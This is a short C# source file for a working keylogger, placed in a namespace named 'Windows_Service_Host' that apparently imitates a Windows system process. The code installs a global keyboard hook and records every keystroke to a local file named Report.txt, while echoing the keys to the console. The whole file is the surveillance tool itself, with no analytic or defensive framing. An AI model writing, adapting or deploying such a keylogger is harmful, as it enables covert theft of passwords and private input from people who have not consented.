using System;
using System.Drawing;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Keystroke.API;
using System.ComponentModel;
using System.IO;
using System.Windows.Markup;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace Windows_Service_Host
{
    class Keylogger
    {

        // createFile creates an empty text file in the program directory.
        // side effects: creates a text file.
        public static void createFile()
        {
            using (FileStream fs = File.Create("Report.txt"))
            {
            }
        }
        
        // The main method displays the date and outputs any keystrokes typed while the program is opened.
        // side effects: console output, writing to file
        static void Main(string[] args)
        {
            using (var api = new KeystrokeAPI())
            {
                if (!File.Exists("Report.txt"))
                {
                    createFile();
                }
                StreamWriter report = new StreamWriter("Report.txt", append: true);
                report.AutoFlush = true;
                using (report)
                {
                    api.CreateKeyboardHook((character) =>
                    {
                        Console.Write(character);
                        report.Write(character);
                    });

                Application.Run();
                }
            }
        }

    }
}
